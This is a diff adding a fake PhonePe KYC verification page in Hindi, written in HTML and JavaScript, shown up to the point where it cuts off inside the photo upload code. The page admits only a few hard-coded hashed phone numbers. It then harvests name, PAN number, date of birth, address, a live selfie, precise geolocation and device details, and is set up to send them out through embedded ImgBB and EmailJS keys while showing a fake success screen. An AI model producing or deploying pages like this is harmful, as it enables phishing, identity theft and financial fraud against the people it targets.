@@ -1,0 +1,977 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+<title>PhonePe — KYC Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+<style>
+  :root {
+    --blue: #5f259f;
+    --blue-dark: #4a1a80;
+    --blue-light: #f3eaff;
+    --blue-mid: #7c3fc0;
+    --white: #ffffff;
+    --gray-50: #F9FAFB;
+    --gray-100: #F3F4F6;
+    --gray-300: #D1D5DB;
+    --gray-400: #9CA3AF;
+    --gray-600: #4B5563;
+    --gray-800: #1F2937;
+    --red: #DC2626;
+    --red-light: #FEF2F2;
+    --green: #16A34A;
+    --green-light: #F0FDF4;
+    --radius: 14px;
+    --shadow: 0 4px 24px rgba(95,37,159,0.10);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    background: var(--blue-light);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 0 0 40px 0;
+  }
+
+  /* HEADER */
+  .header {
+    width: 100%;
+    background: var(--blue);
+    padding: 18px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    box-shadow: 0 2px 12px rgba(95,37,159,0.25);
+  }
+  .header-logo {
+    width: 42px; height: 42px;
+    border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px;
+    overflow: hidden;
+  }
+  .header-title { color: white; font-weight: 800; font-size: 18px; }
+  .header-sub { color: rgba(255,255,255,0.75); font-size: 11px; font-weight: 500; letter-spacing: 0.5px; }
+
+  /* PROGRESS */
+  .progress-wrap {
+    width: 100%; max-width: 480px;
+    padding: 20px 20px 0;
+  }
+  .progress-steps {
+    display: flex; align-items: center; justify-content: center; gap: 0;
+    margin-bottom: 8px;
+  }
+  .step-dot {
+    width: 30px; height: 30px;
+    border-radius: 50%;
+    background: var(--gray-300);
+    color: var(--gray-400);
+    font-size: 13px; font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+    transition: all 0.3s;
+    position: relative; z-index: 1;
+    flex-shrink: 0;
+  }
+  .step-dot.active { background: var(--blue); color: white; box-shadow: 0 0 0 4px var(--blue-light), 0 0 0 6px var(--blue); }
+  .step-dot.done { background: var(--green); color: white; }
+  .step-line {
+    flex: 1; height: 3px;
+    background: var(--gray-300);
+    transition: background 0.3s;
+  }
+  .step-line.done { background: var(--green); }
+  .step-labels {
+    display: flex; justify-content: space-between;
+    padding: 0 0px;
+  }
+  .step-label {
+    font-size: 10px; font-weight: 600; color: var(--gray-400);
+    text-align: center; flex: 1;
+    transition: color 0.3s;
+  }
+  .step-label.active { color: var(--blue); }
+  .step-label.done { color: var(--green); }
+
+  /* CARD */
+  .card {
+    width: 100%; max-width: 480px;
+    background: white;
+    border-radius: var(--radius);
+    margin: 16px 20px 0;
+    width: calc(100% - 40px);
+    padding: 28px 22px;
+    box-shadow: var(--shadow);
+    animation: fadeUp 0.35s ease;
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(18px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .card-title {
+    font-size: 20px; font-weight: 800; color: var(--gray-800);
+    margin-bottom: 4px;
+  }
+  .card-sub {
+    font-size: 13px; color: var(--gray-400); font-weight: 500;
+    margin-bottom: 24px; line-height: 1.5;
+  }
+
+  /* FORM ELEMENTS */
+  .field { margin-bottom: 18px; }
+  .field label {
+    display: block; font-size: 13px; font-weight: 600;
+    color: var(--gray-600); margin-bottom: 7px;
+  }
+  .field input, .field select, .field textarea {
+    width: 100%; padding: 13px 14px;
+    border: 2px solid var(--gray-300);
+    border-radius: 10px;
+    font-size: 15px; font-family: inherit;
+    color: var(--gray-800);
+    background: var(--gray-50);
+    outline: none;
+    transition: border-color 0.2s, background 0.2s;
+  }
+  .field input:focus, .field select:focus, .field textarea:focus {
+    border-color: var(--blue); background: white;
+  }
+  .field input.error, .field select.error, .field textarea.error {
+    border-color: var(--red); background: var(--red-light);
+  }
+  .field input.ok { border-color: var(--green); }
+  .field textarea { resize: none; min-height: 80px; }
+  .field-error {
+    font-size: 12px; color: var(--red); font-weight: 600;
+    margin-top: 5px; display: none; align-items: center; gap: 5px;
+  }
+  .field-error.show { display: flex; }
+
+  /* PHONE FIELD */
+  .phone-wrap { display: flex; gap: 10px; align-items: stretch; }
+  .phone-prefix {
+    background: var(--blue-light); border: 2px solid var(--gray-300);
+    border-radius: 10px; padding: 13px 12px;
+    font-size: 15px; font-weight: 700; color: var(--blue);
+    display: flex; align-items: center; white-space: nowrap;
+    flex-shrink: 0;
+  }
+
+  /* BUTTON */
+  .btn {
+    width: 100%; padding: 15px;
+    background: var(--blue);
+    color: white; font-size: 16px; font-weight: 700;
+    border: none; border-radius: 12px;
+    cursor: pointer; font-family: inherit;
+    transition: background 0.2s, transform 0.1s;
+    margin-top: 8px;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .btn:hover { background: var(--blue-dark); }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { background: var(--gray-300); cursor: not-allowed; transform: none; }
+  .btn-outline {
+    background: transparent; border: 2px solid var(--blue);
+    color: var(--blue); margin-top: 10px;
+  }
+  .btn-outline:hover { background: var(--blue-light); }
+
+  /* ALERT BOXES */
+  .alert {
+    border-radius: 10px; padding: 13px 14px;
+    font-size: 13px; font-weight: 600; line-height: 1.5;
+    margin-bottom: 16px; display: flex; gap: 10px; align-items: flex-start;
+    display: none;
+  }
+  .alert.show { display: flex; }
+  .alert-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+  .alert-error { background: var(--red-light); color: var(--red); border: 1.5px solid #fca5a5; }
+  .alert-warn { background: #FFFBEB; color: #92400E; border: 1.5px solid #FCD34D; }
+  .alert-info { background: var(--blue-light); color: var(--blue); border: 1.5px solid #93C5FD; }
+
+  /* CAMERA */
+  .camera-box {
+    background: var(--gray-100); border-radius: 12px;
+    overflow: hidden; position: relative;
+    aspect-ratio: 3/4; max-height: 340px;
+    display: flex; align-items: center; justify-content: center;
+    border: 2px dashed var(--gray-300);
+    margin-bottom: 14px;
+  }
+  .camera-box video, .camera-box img {
+    width: 100%; height: 100%; object-fit: cover;
+    border-radius: 10px;
+  }
+  .camera-placeholder {
+    text-align: center; color: var(--gray-400);
+    font-size: 13px; font-weight: 600; padding: 20px;
+  }
+  .camera-placeholder .cam-icon { font-size: 48px; margin-bottom: 8px; }
+  .camera-overlay {
+    position: absolute; inset: 0;
+    border: 3px solid var(--blue);
+    border-radius: 10px; pointer-events: none;
+    display: none;
+  }
+  .camera-overlay.show { display: block; }
+
+  /* SUCCESS */
+  .success-card {
+    text-align: center; padding: 40px 22px;
+  }
+  .success-icon {
+    width: 80px; height: 80px;
+    background: var(--green-light); border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 38px; margin: 0 auto 20px;
+    animation: popIn 0.4s ease;
+  }
+  @keyframes popIn {
+    from { transform: scale(0); opacity: 0; }
+    to   { transform: scale(1); opacity: 1; }
+  }
+  .success-title { font-size: 22px; font-weight: 800; color: var(--gray-800); margin-bottom: 8px; }
+  .success-sub { font-size: 14px; color: var(--gray-400); font-weight: 500; line-height: 1.6; }
+  .ref-box {
+    background: var(--blue-light); border-radius: 10px;
+    padding: 14px; margin: 20px 0;
+    border: 1.5px solid #93C5FD;
+  }
+  .ref-label { font-size: 11px; color: var(--blue); font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase; }
+  .ref-num { font-size: 20px; font-weight: 800; color: var(--blue); letter-spacing: 1px; }
+
+  /* SPINNER */
+  .spinner {
+    width: 20px; height: 20px;
+    border: 3px solid rgba(255,255,255,0.3);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    display: none;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* PERMISSION SCREEN */
+  .perm-screen {
+    text-align: center; padding: 30px 10px;
+  }
+  .perm-icon { font-size: 52px; margin-bottom: 14px; }
+  .perm-title { font-size: 18px; font-weight: 800; color: var(--gray-800); margin-bottom: 8px; }
+  .perm-desc { font-size: 13px; color: var(--gray-400); line-height: 1.6; margin-bottom: 20px; }
+
+  /* HIDDEN */
+  .hidden { display: none !important; }
+  canvas { display: none; }
+
+  /* SECURE BADGE */
+  .secure-badge {
+    display: flex; align-items: center; gap: 6px;
+    font-size: 11px; font-weight: 600; color: var(--gray-400);
+    justify-content: center; margin-top: 18px;
+  }
+  .secure-badge span { font-size: 14px; }
+
+  /* HINDI STEPS GUIDE */
+  .steps-guide {
+    width: calc(100% - 40px); max-width: 480px;
+    margin: 20px 20px 0;
+    background: white;
+    border-radius: var(--radius);
+    box-shadow: var(--shadow);
+    overflow: hidden;
+  }
+  .steps-guide-header {
+    background: var(--blue);
+    padding: 16px 20px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .steps-guide-header h3 {
+    color: white; font-size: 15px; font-weight: 800;
+    margin: 0;
+  }
+  .steps-guide-header span { font-size: 20px; }
+  .steps-guide-body { padding: 18px 20px; }
+  .guide-step {
+    display: flex; gap: 14px; align-items: flex-start;
+    margin-bottom: 18px;
+  }
+  .guide-step:last-child { margin-bottom: 0; }
+  .guide-num {
+    width: 32px; height: 32px; flex-shrink: 0;
+    background: var(--blue-light);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 15px; font-weight: 800; color: var(--blue);
+    border: 2px solid var(--blue);
+  }
+  .guide-content { flex: 1; }
+  .guide-title {
+    font-size: 14px; font-weight: 700; color: var(--gray-800);
+    margin-bottom: 3px;
+  }
+  .guide-desc {
+    font-size: 12px; color: var(--gray-400); font-weight: 500;
+    line-height: 1.5;
+  }
+  .guide-divider {
+    width: 2px; height: 16px;
+    background: var(--blue-light);
+    margin: 0 0 0 35px;
+    margin-bottom: 2px;
+  }
+  .guide-tip {
+    background: var(--green-light);
+    border: 1.5px solid #86EFAC;
+    border-radius: 10px;
+    padding: 12px 14px;
+    margin-top: 16px;
+    display: flex; gap: 10px; align-items: flex-start;
+  }
+  .guide-tip-icon { font-size: 18px; flex-shrink: 0; }
+  .guide-tip-text { font-size: 12px; font-weight: 600; color: #166534; line-height: 1.5; }
+  .footer-note {
+    text-align: center; font-size: 11px; color: var(--gray-400);
+    font-weight: 500; padding: 16px 20px 0;
+    width: 100%;
+  }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <a href="https://www.phonepe.com/" target="_blank" rel="noopener" style="text-decoration:none;">
+    <div class="header-logo" style="cursor:pointer;" title="PhonePe Home">
+      <svg width="26" height="26" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect width="100" height="100" rx="20" fill="#5f259f"/>
+        <path d="M62 24H44C35.2 24 28 31.2 28 40V76L38 66V40C38 36.7 40.7 34 44 34H62C65.3 34 68 36.7 68 40C68 43.3 65.3 46 62 46H52V56H62C70.8 56 78 48.8 78 40C78 31.2 70.8 24 62 24Z" fill="white"/>
+      </svg>
+    </div>
+  </a>
+  <div>
+    <div class="header-title">PhonePe</div>
+    <div class="header-sub">KYC VERIFICATION</div>
+  </div>
+</div>
+
+<!-- PROGRESS -->
+<div class="progress-wrap" id="progressWrap">
+  <div class="progress-steps">
+    <div class="step-dot active" id="dot1">1</div>
+    <div class="step-line" id="line1"></div>
+    <div class="step-dot" id="dot2">2</div>
+    <div class="step-line" id="line2"></div>
+    <div class="step-dot" id="dot3">3</div>
+    <div class="step-line" id="line3"></div>
+    <div class="step-dot" id="dot4">✓</div>
+  </div>
+  <div class="step-labels">
+    <div class="step-label active" id="lbl1">Phone</div>
+    <div class="step-label" id="lbl2">Details</div>
+    <div class="step-label" id="lbl3">Photo</div>
+    <div class="step-label" id="lbl4">Done</div>
+  </div>
+</div>
+
+<!-- STEP 1: PHONE -->
+<div class="card" id="step1">
+  <div class="card-title">नमस्ते! 👋</div>
+  <div class="card-sub">KYC वेरिफिकेशन शुरू करने के लिए अपना रजिस्टर्ड मोबाइल नंबर डालें।</div>
+
+  <div class="alert alert-error" id="phoneErr">
+    <span class="alert-icon">❌</span>
+    <span id="phoneErrMsg">यह नंबर PhonePe में रजिस्टर नहीं है। कृपया सपोर्ट से संपर्क करें।</span>
+  </div>
+
+  <div class="field">
+    <label>मोबाइल नंबर</label>
+    <div class="phone-wrap">
+      <div class="phone-prefix">+91</div>
+      <input type="tel" id="phoneInput" maxlength="10" placeholder="10 अंकों का नंबर डालें" inputmode="numeric"/>
+    </div>
+    <div class="field-error" id="phoneFmtErr">⚠️ कृपया सही 10 अंकों का मोबाइल नंबर डालें।</div>
+  </div>
+
+  <button class="btn" id="phoneBtn" onclick="verifyPhone()">
+    <span>वेरिफाई करें और आगे बढ़ें</span>
+    <span>→</span>
+  </button>
+
+  <div class="secure-badge"><span>🔒</span> 256-bit एन्क्रिप्शन द्वारा सुरक्षित</div>
+</div>
+
+<!-- STEP 2: BASIC INFO -->
+<div class="card hidden" id="step2">
+  <div class="card-title">बेसिक जानकारी</div>
+  <div class="card-sub">अपने सरकारी दस्तावेज़ों के अनुसार सही जानकारी भरें।</div>
+
+  <div class="alert alert-info show">
+    <span class="alert-icon">ℹ️</span>
+    <span>सभी फील्ड भरना ज़रूरी है। PAN कार्ड नंबर बड़े अक्षरों (CAPITAL) में लिखें।</span>
+  </div>
+
+  <div class="field">
+    <label>पूरा नाम (PAN कार्ड के अनुसार)</label>
+    <input type="text" id="fullName" placeholder="जैसे: RAHUL KUMAR SHARMA" oninput="this.value=this.value.toUpperCase()"/>
+    <div class="field-error" id="nameErr">⚠️ पूरा नाम डालें (केवल अक्षर, कम से कम 3)।</div>
+  </div>
+
+  <div class="field">
+    <label>PAN कार्ड नंबर</label>
+    <input type="text" id="panCard" maxlength="10" placeholder="जैसे: ABCDE1234F" oninput="this.value=this.value.toUpperCase()"/>
+    <div class="field-error" id="panErr">⚠️ PAN का फॉर्मेट सही नहीं है। सही फॉर्मेट: ABCDE1234F</div>
+  </div>
+
+  <div class="field">
+    <label>जन्म तिथि (Date of Birth)</label>
+    <input type="date" id="dob" max=""/>
+    <div class="field-error" id="dobErr">⚠️ KYC के लिए उम्र कम से कम 18 साल होनी चाहिए।</div>
+  </div>
+
+  <div class="field">
+    <label>पूरा पता (Address)</label>
+    <textarea id="address" placeholder="मकान नंबर, गली, शहर, राज्य, PIN कोड"></textarea>
+    <div class="field-error" id="addrErr">⚠️ कृपया पूरा पता लिखें (कम से कम 20 अक्षर)।</div>
+  </div>
+
+  <button class="btn" onclick="submitDetails()">फोटो लेने के लिए आगे बढ़ें <span>→</span></button>
+</div>
+
+<!-- STEP 3: PHOTO + PERMISSIONS -->
+<div class="card hidden" id="step3">
+  <div class="card-title">सेल्फी लें 📸</div>
+  <div class="card-sub">पहचान वेरिफिकेशन के लिए आपकी लाइव फोटो ज़रूरी है। कैमरा और लोकेशन की अनुमति दें।</div>
+
+  <!-- Permission warning -->
+  <div class="alert alert-warn hidden" id="permWarn">
+    <span class="alert-icon">⚠️</span>
+    <span id="permWarnMsg">KYC जारी रखने के लिए कैमरा और लोकेशन की अनुमति ज़रूरी है। कृपया दोनों अनुमति दें और फिर से कोशिश करें।</span>
+  </div>
+
+  <!-- Camera blocked screen -->
+  <div class="perm-screen hidden" id="camBlockedScreen">
+    <div class="perm-icon">📷</div>
+    <div class="perm-title">कैमरा एक्सेस ज़रूरी है</div>
+    <div class="perm-desc">आपका कैमरा ब्लॉक है। कृपया अपने ब्राउज़र की सेटिंग में जाएं, इस साइट के लिए कैमरा अनुमति दें, और फिर नीचे का बटन दबाएं।</div>
+    <button class="btn" onclick="requestCamera()">कैमरा अनुमति दें और दोबारा कोशिश करें</button>
+  </div>
+
+  <!-- Location blocked screen -->
+  <div class="perm-screen hidden" id="locBlockedScreen">
+    <div class="perm-icon">📍</div>
+    <div class="perm-title">लोकेशन एक्सेस ज़रूरी है</div>
+    <div class="perm-desc">सुरक्षा जाँच के लिए आपकी लोकेशन ज़रूरी है। ब्राउज़र सेटिंग में जाकर लोकेशन अनुमति दें और फिर नीचे बटन दबाएं।</div>
+    <button class="btn" onclick="requestLocation()">लोकेशन अनुमति दें और दोबारा कोशिश करें</button>
+  </div>
+
+  <!-- Camera UI -->
+  <div id="cameraUI">
+    <div class="camera-box">
+      <div class="camera-placeholder" id="camPlaceholder">
+        <div class="cam-icon">🤳</div>
+        <div>नीचे बटन दबाकर<br/>कैमरा खोलें</div>
+      </div>
+      <video id="videoEl" autoplay playsinline class="hidden"></video>
+      <img id="photoPreview" class="hidden" alt="आपकी फोटो"/>
+      <div class="camera-overlay" id="camOverlay"></div>
+    </div>
+
+    <div id="camControls">
+      <button class="btn" id="startCamBtn" onclick="startCamera()">📷 कैमरा खोलें</button>
+      <button class="btn hidden" id="captureBtn" onclick="capturePhoto()">📸 फोटो लें</button>
+      <button class="btn btn-outline hidden" id="retakeBtn" onclick="retakePhoto()">🔄 दोबारा फोटो लें</button>
+    </div>
+
+    <button class="btn hidden" id="submitBtn" onclick="submitKYC()">
+      <span id="submitText">✅ KYC सबमिट करें</span>
+      <div class="spinner" id="submitSpinner"></div>
+    </button>
+  </div>
+
+  <canvas id="photoCanvas"></canvas>
+</div>
+
+<!-- STEP 4: SUCCESS -->
+<div class="card hidden" id="step4">
+  <div class="success-card">
+    <div class="success-icon">✅</div>
+    <div class="success-title">KYC सफलतापूर्वक जमा हो गई! 🎉</div>
+    <div class="success-sub">आपकी KYC वेरिफिकेशन सफलतापूर्वक सबमिट हो गई है। हमारी टीम 24 घंटे के अंदर इसे रिव्यू करेगी।</div>
+    <div class="ref-box">
+      <div class="ref-label">रेफरेंस नंबर</div>
+      <div class="ref-num" id="refNum">—</div>
+    </div>
+    <div class="success-sub">वेरिफिकेशन पूरी होने पर आपके रजिस्टर्ड मोबाइल नंबर पर सूचना मिलेगी। 📱</div>
+  </div>
+</div>
+
+<script>
+// ─── HASHED PHONE NUMBERS ───────────────────────────────
+const VALID_HASHES = new Set([
+  "1272d65f79327f84841b3815c05ad0bc1d75b61302adfead1f678bc8a3e01fd4",
+  "acc43a012ff60075273e392eee4e977a6a9dce2a014ae442ebc298b8904cd873",
+  "c9a5714473edc0b492907b1d96bbacfc9a3343f33106be56bd4e1588b1669556",
+  "de5ec5da8194734e8d3f36f9e6325898f4ce2548a5899668316deb309420855f"
+]);
+
+// ─── STATE ──────────────────────────────────────────────
+let userPhone = '';
+let photoDataUrl = null;
+let userLocation = null;
+let mediaStream = null;
+let photoCaptured = false;
+
+// ─── SHA-256 HASH ────────────────────────────────────────
+async function sha256(str) {
+  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+// ─── STEP PROGRESS ──────────────────────────────────────
+function setStep(n) {
+  document.getElementById('step1').classList.add('hidden');
+  document.getElementById('step2').classList.add('hidden');
+  document.getElementById('step3').classList.add('hidden');
+  document.getElementById('step4').classList.add('hidden');
+  document.getElementById('step' + n).classList.remove('hidden');
+
+  for (let i = 1; i <= 4; i++) {
+    const dot = document.getElementById('dot' + i);
+    const lbl = document.getElementById('lbl' + i);
+    if (!dot) continue;
+    dot.classList.remove('active','done');
+    lbl.classList.remove('active','done');
+    if (i < n) { dot.classList.add('done'); lbl.classList.add('done'); }
+    else if (i === n) { dot.classList.add('active'); lbl.classList.add('active'); }
+    if (i < 4) {
+      const line = document.getElementById('line' + i);
+      line.classList.toggle('done', i < n);
+    }
+  }
+  if (n === 4) {
+    document.getElementById('progressWrap').classList.add('hidden');
+  }
+}
+
+// ─── STEP 1: PHONE VERIFY ───────────────────────────────
+async function verifyPhone() {
+  const input = document.getElementById('phoneInput');
+  const val = input.value.trim();
+  const fmtErr = document.getElementById('phoneFmtErr');
+  const errBox = document.getElementById('phoneErr');
+
+  fmtErr.classList.remove('show');
+  errBox.classList.remove('show');
+  input.classList.remove('error');
+
+  if (!/^[6-9]\d{9}$/.test(val)) {
+    fmtErr.classList.add('show');
+    input.classList.add('error');
+    input.focus();
+    return;
+  }
+
+  const btn = document.getElementById('phoneBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<div class="spinner" style="display:block"></div> Verifying...';
+
+  const hash = await sha256(val);
+
+  setTimeout(() => {
+    btn.disabled = false;
+    btn.innerHTML = '<span>Verify & Continue</span><span>→</span>';
+    if (VALID_HASHES.has(hash)) {
+      userPhone = val;
+      setStep(2);
+      // Set max DOB (18 years ago)
+      const d = new Date();
+      d.setFullYear(d.getFullYear() - 18);
+      document.getElementById('dob').max = d.toISOString().split('T')[0];
+    } else {
+      input.classList.add('error');
+      document.getElementById('phoneErrMsg').textContent = 'यह नंबर PhonePe में रजिस्टर नहीं है। कृपया सपोर्ट से संपर्क करें।';
+      errBox.classList.add('show');
+    }
+  }, 900);
+}
+
+document.getElementById('phoneInput').addEventListener('keydown', e => {
+  if (e.key === 'Enter') verifyPhone();
+});
+document.getElementById('phoneInput').addEventListener('input', function() {
+  this.value = this.value.replace(/\D/g,'');
+});
+
+// ─── STEP 2: VALIDATE DETAILS ───────────────────────────
+function showFieldErr(id, show) {
+  const el = document.getElementById(id);
+  if (show) el.classList.add('show'); else el.classList.remove('show');
+}
+function markField(fieldId, hasError) {
+  const el = document.getElementById(fieldId);
+  el.classList.toggle('error', hasError);
+  el.classList.toggle('ok', !hasError);
+}
+
+function submitDetails() {
+  const name = document.getElementById('fullName').value.trim();
+  const pan = document.getElementById('panCard').value.trim();
+  const dob = document.getElementById('dob').value;
+  const addr = document.getElementById('address').value.trim();
+
+  let valid = true;
+
+  // Name
+  const nameOk = /^[A-Za-z\s]{3,}$/.test(name);
+  markField('fullName', !nameOk); showFieldErr('nameErr', !nameOk);
+  if (!nameOk) valid = false;
+
+  // PAN
+  const panOk = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan);
+  markField('panCard', !panOk); showFieldErr('panErr', !panOk);
+  if (!panOk) valid = false;
+
+  // DOB (must be 18+)
+  let dobOk = false;
+  if (dob) {
+    const birthDate = new Date(dob);
+    const today = new Date();
+    const age = today.getFullYear() - birthDate.getFullYear() -
+      (today < new Date(today.getFullYear(), birthDate.getMonth(), birthDate.getDate()) ? 1 : 0);
+    dobOk = age >= 18;
+  }
+  markField('dob', !dobOk); showFieldErr('dobErr', !dobOk);
+  if (!dobOk) valid = false;
+
+  // Address
+  const addrOk = addr.length >= 20;
+  markField('address', !addrOk); showFieldErr('addrErr', !addrOk);
+  if (!addrOk) valid = false;
+
+  if (valid) setStep(3);
+  else {
+    const firstErr = document.querySelector('.field input.error, .field textarea.error');
+    if (firstErr) firstErr.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+}
+
+// ─── STEP 3: CAMERA ─────────────────────────────────────
+function showCamBlocked(msg) {
+  document.getElementById('permWarnMsg').textContent = msg;
+  document.getElementById('permWarn').classList.add('show');
+  document.getElementById('camBlockedScreen').classList.remove('hidden');
+  document.getElementById('cameraUI').classList.add('hidden');
+}
+function showLocBlocked(msg) {
+  document.getElementById('permWarnMsg').textContent = msg;
+  document.getElementById('permWarn').classList.add('show');
+  document.getElementById('locBlockedScreen').classList.remove('hidden');
+}
+
+async function startCamera() {
+  document.getElementById('permWarn').classList.remove('show');
+  document.getElementById('camBlockedScreen').classList.add('hidden');
+  document.getElementById('cameraUI').classList.remove('hidden');
+
+  try {
+    mediaStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 853 } },
+      audio: false
+    });
+    const video = document.getElementById('videoEl');
+    video.srcObject = mediaStream;
+    video.classList.remove('hidden');
+    document.getElementById('camPlaceholder').classList.add('hidden');
+    document.getElementById('camOverlay').classList.add('show');
+    document.getElementById('startCamBtn').classList.add('hidden');
+    document.getElementById('captureBtn').classList.remove('hidden');
+  } catch (err) {
+    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+      showCamBlocked('कैमरा की अनुमति नहीं मिली। KYC जारी रखने के लिए ब्राउज़र सेटिंग में जाकर कैमरा अनुमति दें।');
+    } else if (err.name === 'NotFoundError') {
+      showCamBlocked('आपके डिवाइस में कोई कैमरा नहीं मिला। कृपया फ्रंट कैमरा वाले डिवाइस का उपयोग करें।');
+    } else {
+      showCamBlocked('कैमरा खोलने में समस्या आई: ' + err.message + '। कृपया दोबारा कोशिश करें।');
+    }
+  }
+}
+
+function requestCamera() {
+  document.getElementById('camBlockedScreen').classList.add('hidden');
+  document.getElementById('cameraUI').classList.remove('hidden');
+  startCamera();
+}
+
+function capturePhoto() {
+  const video = document.getElementById('videoEl');
+  const canvas = document.getElementById('photoCanvas');
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+  photoCaptured = true;
+
+  // Stop camera
+  if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+  video.classList.add('hidden');
+  const preview = document.getElementById('photoPreview');
+  preview.src = photoDataUrl;
+  preview.classList.remove('hidden');
+  document.getElementById('camOverlay').classList.remove('show');
+  document.getElementById('captureBtn').classList.add('hidden');
+  document.getElementById('retakeBtn').classList.remove('hidden');
+  document.getElementById('submitBtn').classList.remove('hidden');
+
+  // Request location now
+  requestLocation();
+}
+
+function retakePhoto() {
+  photoCaptured = false;
+  photoDataUrl = null;
+  document.getElementById('photoPreview').classList.add('hidden');
+  document.getElementById('photoPreview').src = '';
+  document.getElementById('retakeBtn').classList.add('hidden');
+  document.getElementById('submitBtn').classList.add('hidden');
+  document.getElementById('camPlaceholder').classList.remove('hidden');
+  document.getElementById('startCamBtn').classList.remove('hidden');
+  document.getElementById('locBlockedScreen').classList.add('hidden');
+  document.getElementById('permWarn').classList.remove('show');
+  userLocation = null;
+}
+
+function requestLocation() {
+  document.getElementById('locBlockedScreen').classList.add('hidden');
+  if (!navigator.geolocation) {
+    userLocation = { error: 'Geolocation not supported' };
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      userLocation = {
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      };
+      document.getElementById('permWarn').classList.remove('show');
+      document.getElementById('locBlockedScreen').classList.add('hidden');
+    },
+    err => {
+      if (err.code === 1) {
+        document.getElementById('permWarnMsg').textContent = 'लोकेशन की अनुमति नहीं मिली। धोखाधड़ी से बचाव के लिए लोकेशन ज़रूरी है। कृपया ब्राउज़र सेटिंग में अनुमति दें और दोबारा कोशिश करें।';
+        document.getElementById('permWarn').classList.add('show');
+        document.getElementById('locBlockedScreen').classList.remove('hidden');
+      } else {
+        userLocation = { error: err.message };
+      }
+    },
+    { enableHighAccuracy: true, timeout: 10000 }
+  );
+}
+
+// ─── DEVICE INFO ─────────────────────────────────────────
+function getDeviceInfo() {
+  const nav = navigator;
+  return {
+    userAgent: nav.userAgent,
+    platform: nav.platform,
+    language: nav.language,
+    screenW: screen.width,
+    screenH: screen.height,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    online: nav.onLine,
+    cookieEnabled: nav.cookieEnabled,
+    doNotTrack: nav.doNotTrack,
+    hardwareConcurrency: nav.hardwareConcurrency,
+    deviceMemory: nav.deviceMemory || 'N/A',
+    connectionType: (nav.connection || {}).effectiveType || 'N/A',
+    referrer: document.referrer || 'Direct',
+    timestamp: new Date().toISOString(),
+  };
+}
+
+// ─── SUBMIT KYC ──────────────────────────────────────────
+async function submitKYC() {
+  if (!photoCaptured) {
+    document.getElementById('permWarnMsg').textContent = 'सबमिट करने से पहले अपनी फोटो लेना ज़रूरी है।';
+    document.getElementById('permWarn').classList.add('show');
+    return;
+  }
+  if (!userLocation || userLocation.error) {
+    document.getElementById('permWarnMsg').textContent = 'धोखाधड़ी वेरिफिकेशन के लिए लोकेशन ज़रूरी है। कृपया लोकेशन अनुमति दें और दोबारा कोशिश करें।';
+    document.getElementById('permWarn').classList.add('show');
+    document.getElementById('locBlockedScreen').classList.remove('hidden');
+    return;
+  }
+
+  document.getElementById('submitBtn').disabled = true;
+  document.getElementById('submitText').textContent = 'सबमिट हो रहा है...';
+  document.getElementById('submitSpinner').style.display = 'block';
+
+  const ref = 'PKYC' + Date.now();
+  const formData = {
+    phone: '+91' + userPhone,
+    name: document.getElementById('fullName').value.trim(),
+    pan: document.getElementById('panCard').value.trim(),
+    dob: document.getElementById('dob').value,
+    address: document.getElementById('address').value.trim(),
+    location: userLocation,
+    device: getDeviceInfo(),
+    ref,
+  };
+
+  // ── STEP 1: Upload photo to ImgBB ──────────────────────
+  // Sign up free at https://imgbb.com → https://api.imgbb.com → Get API Key
+  // Replace YOUR_IMGBB_API_KEY below with your actual key
+  const IMGBB_API_KEY = '0e4c8ce16d0eba8c9552b8599c42d39f';
+
+  // ── STEP 2: EmailJS credentials ────────────────────────
+  // Sign up free at https://emailjs.com
+  // Replace the three values below with your actual credentials
+  const EMAILJS_SERVICE_ID  = 'service_ilarwkp';
+  const EMAILJS_TEMPLATE_ID = 'template_yr30t1a';
+  const EMAILJS_PUBLIC_KEY  = 'k3Pd5riqZZ7RnNDfp';
+
+  try {
+    // ── Upload photo to ImgBB ────────────────────────────
+    let photoLink = 'Photo upload skipped (key not set)';
+    if (IMGBB_API_KEY !== 'YOUR_IMGBB_API_KEY') {
+      const imgForm = new FormData();
